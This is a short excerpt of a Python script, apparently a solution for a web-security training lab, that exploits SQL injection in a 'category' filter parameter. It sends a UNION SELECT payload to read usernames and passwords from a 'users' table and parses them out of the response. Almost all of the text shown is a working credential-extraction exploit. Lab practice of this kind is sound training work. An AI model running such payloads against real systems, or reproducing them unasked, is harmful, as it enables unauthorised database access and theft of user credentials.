...
def retrievingdatafromothertables(url):
    payload = "'+UNION+SELECT+username,+password+FROM+users--"
    uri = "/filter?category="
    fullurl = url + uri
    fullpayload = fullurl + payload
    r = requests.get(fullpayload, verify = False, proxies=proxies)
    rows1, rows2 = retrievedatafromtable(r)
    for i in range(0, len(rows2)):
        username = rows1[i].get_text()
        password = rows2[i].get_text()
...
if __name__ == '__main__':
    ...
    retrievingdatafromothertables(url)
